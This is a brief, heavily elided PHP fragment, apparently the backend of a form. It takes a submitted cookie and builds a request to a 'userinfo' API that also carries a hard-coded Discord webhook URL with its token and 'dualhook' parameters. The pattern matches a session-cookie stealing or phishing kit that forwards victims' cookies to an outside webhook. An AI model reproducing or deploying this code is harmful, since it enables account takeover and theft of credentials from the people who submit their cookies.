...
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    ...
    if (empty($errors)) {
        ...
        if ($cookie) {
            ...
            $userInfoUrl = "$dom/controlPage/apis/userinfo.php?cookie=" . urlencode($cookie) . "&web=https%3A%2F%2Fdiscord.com%2Fapi%2Fwebhooks%2F1438083123803062272%2FTqk9BnZlnqRMxnwMuG3ISbdOgOET_AWXR3PQIGgFyXM5AJZOHwAZcBwD0qvD_t8vDQiE&dh=&dualhook=";
